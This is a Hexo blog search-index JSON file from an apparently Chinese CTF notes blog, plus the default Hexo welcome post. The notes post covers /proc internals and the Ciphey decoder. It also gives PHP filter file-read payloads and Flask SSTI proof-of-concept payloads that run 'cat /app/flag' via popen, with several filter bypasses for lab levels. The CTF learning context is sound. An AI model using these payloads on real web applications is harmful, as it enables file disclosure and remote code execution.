{"meta":{"title":"好看吗?卿","subtitle":"","description":"网络安全 CTF","author":"CHENLY","url":"https://chenzid.github.io","root":"/"},"pages":[{"title":"tags","date":"2022-07-29T11:45:41.000Z","updated":"2022-07-29T11:46:30.180Z","comments":true,"path":"tags/index.html","permalink":"https://chenzid.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"记录","date":"2022-07-29T12:04:32.496Z","updated":"2022-07-11T14:19:30.610Z","comments":true,"path":"2022/07/29/记录/","link":"","permalink":"https://chenzid.github.io/2022/07/29/%E8%AE%B0%E5%BD%95/","excerpt":"","text":"LINUX 内核Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。 proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。 这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F;本进程pid&#x2F;。进程可以通过访问&#x2F;proc&#x2F;self&#x2F;目录来获取自己的信息。 1234/proc/self/maps 得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem 是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存.其中的一些信息比如/proc/pid/cmdline是进程启动时的命令行、/proc/pid/exe是一个软连接指向了该进程可执行ELF、/proc/pid/cwd是一个软连接指向了进程运行的当前路径等等。 Linux的进程伪装：将正常的PID指向恶意ELF程序 1.execve：会在进程ID不变的情况下，将进程内容全部替换、重新装载进程，所以&#x2F;proc&#x2F;self&#x2F;exe也同样被替换了。 12345file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.phpfile=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php CipheyCiphey 是一个使用自然语言处理和人工智能的全自动解密&#x2F;解码&#x2F;破解工具。用法： 12ciphey -t &quot;密文&quot;ciphey -f 文件名 安装： Python3.7或以上 Pip（在 Python 3 上） 使用python3 -m pip install -U ciphey进行安装 利用ciphey --help来查看帮助 但是并不是万能的，只能参考一下，有时候会出现误差的甚至不如自己。 支持破解的密码列表基本加密 Caesar Cipher-凯撒密码 ROT47（使用 ROT47 字母高达 ROT94） ASCII 移位（高达 ROT127，带有完整的 ASCII 字母表） Vigenère Cipher-维吉尼亚密码 Affine Cipher-仿射密码 Binary Substitution Cipher-二进制替换密码 (XY-Cipher) Baconian Cipher -培根密码（两种变体） Soundex Transposition Cipher-转置密码 Pig Latin-猪拉丁语 现代密码学 Repeating-key XOR-重复键异或 Single XOR-单异或 编码 Base2（二进制） Base8（八进制） Base10（十进制） Base16（十六进制） Base32 Base58 比特币 Base58 Flickr（发布候选阶段） Base58 Ripple Base62 Base64 Base64 URL（发布候选阶段） Base69 Base85 Z85（发布候选阶段） ASCII Base85 Base91 Base65536（发布候选阶段） ASCII Reversed text-反转文字 Morse Code-摩尔斯电码 DNA codons-DNA 密码子（释放候选阶段） Atbash Standard Galactic Alphabet-标准银河字母表（又名 Minecraft Enchanting Language） Leetspeak Baudot ITA2 URL encoding-网址编码 SMS Multi-tap DMTF（发布候选阶段） A1Z26（发布候选阶段） Prisoner’s Tap Code-囚犯的窃听代码 UUencode Braille-盲文（1 级） 深奥的语言 (EsoLang) Brainfuck-脑残 123os._wrap_closewarnings.catch_warnings #包含__builtins__模块subprocess.Popen #进行RCE SSTI题目 12[NCTF 2018]flask真香 NSSCTF ssti-flask-labs NSSCTF ssti-flask-labs NSSCTF level 1 无过滤POC &#123;&#123;().__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat /app/flag').read()&#125;&#125; **level 2 过滤&#123;&#123;`** > > POC `&#123;%print(''.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat /app/flag').read())%&#125;` > > `&#123;%print(x.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat /app/flag').read()\"))%&#125;` > > > > **level 3 盲注** > > **level 4 过滤`[]`** > > POC `&#123;&#123;\"\".__class__.__base__.__subclasses__().pop(133).__init__.__globals__.popen('cat /app/flag').read()&#125;&#125; level 5 过滤单双引号 POC 12345Cookie:x1=__builtins__;x2=__import__(&#x27;os&#x27;).popen(&#x27;cat /app/flag&#x27;).read()code=&#123;&#123;x.__init__.__globals__.__getitem__(request.cookies.x1).eval(request.cookies.x2)&#125;&#125; level 6 过滤下划线 POC","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2022-07-29T06:54:44.056Z","updated":"2022-07-29T06:54:44.056Z","comments":true,"path":"2022/07/29/hello-world/","link":"","permalink":"https://chenzid.github.io/2022/07/29/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}